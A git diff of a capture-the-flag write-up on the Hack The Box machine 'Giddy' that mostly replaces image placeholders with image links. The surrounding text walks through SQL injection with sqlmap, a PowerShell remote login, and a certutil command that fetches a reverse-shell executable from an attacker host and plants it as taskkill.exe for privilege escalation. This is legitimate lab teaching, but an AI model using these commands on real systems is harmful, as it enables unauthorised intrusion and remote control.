@@ -90,8 +90,6 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 
 So the first directory, `/remote` shows that it's redirecting us to something else. Let's check this out. 
 
-<remote image>
-
 
 Going to `/remote` redirets our web broswer to `https://10.10.10.104/Remote/en-US/logon.aspx?ReturnUrl=%2fremote` as seen above.
 
@@ -99,13 +97,13 @@ I could try brute forcing some login credentials, but it this seems like it's a 
 
 Next, let's check the `/mvc` directory that was found.
 
-<mvc image>
+![](/assets/images/Giddy/Giddy-MVC.png)
 
 Clicking around on this page, reveals this url: `https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=27`
 
 This looks like an excellent place to attempt an SQLi. Capturing this request in Burp Suite, I saved the request and ran it through sqlmap.
 
-<sqlmap output>
+![](/assets/images/Giddy/Giddy-SQLmap.png)
 
 
 After finding this SQLi injection, I then tried to dump all the tables, get some passwords, get a working SQL shell/OOB shell, the usual stuff. Nothing seemed to work.
@@ -239,12 +237,12 @@ Powershell Remote Access Login
 Plugging in the credentials that we obtained from our SMB server, but using the username `GIDDY\Stacy` to ensure we log into the local machine and not try to authenticate with any domain, we are presented with a Powershell console.
 
 
-<Powershell_screenshot>
+![](/assets/images/Giddy/Powershell-Get.png)
 
 
 Here we can read the user flag as well!
 
-<UserFlag_Screenshot>
+![](/assets/images/Giddy/UserFlagGiddy.png)
 
 
 Now that we have this "shell" let's try to escalate our privileges!
@@ -339,7 +337,7 @@ Uploading Reverse Shell
 Now we have to get this onto the target machine. For this we will utilize the `certutil.exe` command for this. We will start a Python Simple HTTP Server and run the following on the Powershell console to upload our file: `certutil.exe -split -f -urlcache http://10.10.14.21/rev.exe C:\ProgramData\unifi-video\taskkill.exe`
 
 
-<Upload_Screenshot>
+![](/assets/images/Giddy/UploadExe.png)
 
 
 Restarting UniFi Video Service
@@ -351,7 +349,7 @@ This is another concept that seems easy at first, but certain aspects hinder our
 Normally, running `Get-Service` on Powershell would show running and stopped services on the host, but we receive the following error:
 
 
-<Error_image>
+![](/assets/images/Giddy/GetServiceFail.png)
 
 
 So now I have to find a way of enumerating what the service name is. Powershell has a file that is similar to the `.bash_history` file in Linux called `ConsoleHost_history.txt` So Going to the file and checking the contents reveals the following:
@@ -372,7 +370,7 @@ PS C:\Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline>
 So now with our file in place, and the command to run restart the UniFi Video service, we set up an `nc` listener and hope to catch a shell. 
 
 
-<Start_service pic>
+![](/assets/images/Giddy/StartService.png)
 
 
 
